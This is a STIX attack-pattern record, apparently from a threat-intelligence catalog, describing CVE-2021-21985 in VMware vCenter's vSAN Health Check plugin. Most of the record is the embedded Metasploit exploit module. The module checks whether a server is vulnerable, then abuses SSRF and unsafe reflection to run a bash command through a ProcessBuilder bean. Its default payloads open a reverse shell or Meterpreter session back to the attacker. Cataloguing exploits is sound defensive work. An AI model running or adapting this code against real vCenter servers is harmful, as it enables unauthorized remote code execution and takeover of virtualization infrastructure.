{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f530fe15-8433-4add-b916-d0e8a7124e05",
    "created": "2024-08-14T17:01:05.257784Z",
    "modified": "2024-08-14T17:01:05.257787Z",
    "name": "VMware vCenter Server Virtual SAN Health Check Plugin RCE",
    "description": " This module exploits Java unsafe reflection and SSRF in the VMware vCenter Server Virtual SAN Health Check plugin's ProxygenController class to execute code as the vsphere-ui user.  See the vendor advisory for affected and patched versions. Tested against VMware vCenter Server 6.7 Update 3m (Linux appliance). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/vmware_vcenter_vsan_health_rce.rb",
            "external_id": "vmware_vcenter_vsan_health_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-21985"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2021-0010.html"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/X85GKjaVER/cve-2021-21985#rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "http://noahblog.360.cn/vcenter-cve-2021-2021-21985/"
        },
        {
            "source_name": "reference",
            "url": "https://www.iswin.org/2021/06/02/Vcenter-Server-CVE-2021-21985-RCE-PAYLOAD/"
        },
        {
            "source_name": "reference",
            "url": "https://testbnull.medium.com/a-quick-look-at-cve-2021-21985-vcenter-pre-auth-rce-9ecd459150a5"
        },
        {
            "source_name": "reference",
            "url": "https://y4y.space/2021/06/04/learning-jndi-injection-from-cve-2021-21985/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/alt3kx/CVE-2021-21985_PoC"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'VMware vCenter Server Virtual SAN Health Check Plugin RCE',\n        'Description' => %q{\n          This module exploits Java unsafe reflection and SSRF in the VMware\n          vCenter Server Virtual SAN Health Check plugin's ProxygenController\n          class to execute code as the vsphere-ui user.\n\n          See the vendor advisory for affected and patched versions. Tested\n          against VMware vCenter Server 6.7 Update 3m (Linux appliance).\n        },\n        'Author' => [\n          'Ricter Z', # Discovery and PoC used\n          'wvu' # Analysis and exploit\n        ],\n        'References' => [\n          ['CVE', '2021-21985'],\n          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2021-0010.html'],\n          ['URL', 'https://attackerkb.com/topics/X85GKjaVER/cve-2021-21985#rapid7-analysis'],\n          ['URL', 'http://noahblog.360.cn/vcenter-cve-2021-2021-21985/'],\n          # Other great writeups!\n          ['URL', 'https://www.iswin.org/2021/06/02/Vcenter-Server-CVE-2021-21985-RCE-PAYLOAD/'],\n          ['URL', 'https://testbnull.medium.com/a-quick-look-at-cve-2021-21985-vcenter-pre-auth-rce-9ecd459150a5'],\n          ['URL', 'https://y4y.space/2021/06/04/learning-jndi-injection-from-cve-2021-21985/'],\n          ['URL', 'https://github.com/alt3kx/CVE-2021-21985_PoC']\n        ],\n        'DisclosureDate' => '2021-05-25',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'], # TODO: Windows?\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_python_ssl'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [FIRST_ATTEMPT_FAIL], # SSRF can be a little finicky\n          'SideEffects' => [\n            IOC_IN_LOGS, # /var/log/vmware/vsphere-ui/logs/vsphere_client_virgo.log\n            ARTIFACTS_ON_DISK # CmdStager\n          ]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    # https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(\n        target_uri.path,\n        '/ui/h5-vsan/rest/proxy/service/systemProperties/getProperty'\n      ),\n      'ctype' => 'application/json',\n      'data' => {\n        'methodInput' => ['user.name', nil]\n      }.to_json\n    )\n\n    return CheckCode::Unknown unless res\n\n    unless res.code == 200 && res.get_json_document['result'] == 'vsphere-ui'\n      return CheckCode::Safe\n    end\n\n    CheckCode::Vulnerable('System property user.name is vsphere-ui.')\n  end\n\n  def exploit\n    print_status(\"Executing #{payload_instance.refname} (#{target.name})\")\n\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(cmd)\n\n    url = OfflineBundle.new(cmd).to_url\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(\n        target_uri.path,\n        '/ui/h5-vsan/rest/proxy/service/vmodlContext/loadVmodlPackages'\n      ),\n      'ctype' => 'application/json',\n      'data' => {\n        'methodInput' => [\n          [\"https://localhost/vsanHealth/vum/driverOfflineBundle/#{url}\"],\n          false # lazyInit\n        ]\n      }.to_json\n    )\n\n    fail_with(Failure::PayloadFailed, cmd) unless res&.code == 200\n  end\n\n  class OfflineBundle\n    attr_accessor :cmd\n\n    def initialize(cmd)\n      @cmd = cmd\n    end\n\n    def to_xml\n      bean = Rex::Text.rand_text_alpha_lower(8..16)\n      prop = Rex::Text.rand_text_alpha_lower(8..16)\n\n      # https://www.tutorialspoint.com/spring/spring_bean_definition.htm\n      <<~XML\n        <beans>\n          <bean id=\"#{bean}\" class=\"java.lang.ProcessBuilder\">\n            <constructor-arg>\n              <list>\n                <value>/bin/bash</value>\n                <value>-c</value>\n                <value><![CDATA[#{cmd}]]></value>\n              </list>\n            </constructor-arg>\n            <property name=\"#{prop}\" value=\"\\#{#{bean}.start()}\"/>\n          </bean>\n        </beans>\n      XML\n    end\n\n    def to_zip\n      Msf::Util::EXE.to_zip([\n        fname: 'offline_bundle.xml',\n        data: to_xml.gsub(/^\\s+/, '').tr(\"\\n\", '')\n      ])\n    end\n\n    def to_url\n      # https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs\n      \"data:application/zip;base64,#{Rex::Text.encode_base64(to_zip)}\"\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2021-05-25",
    "x_mitre_platforms": [
        "linux'"
    ]
}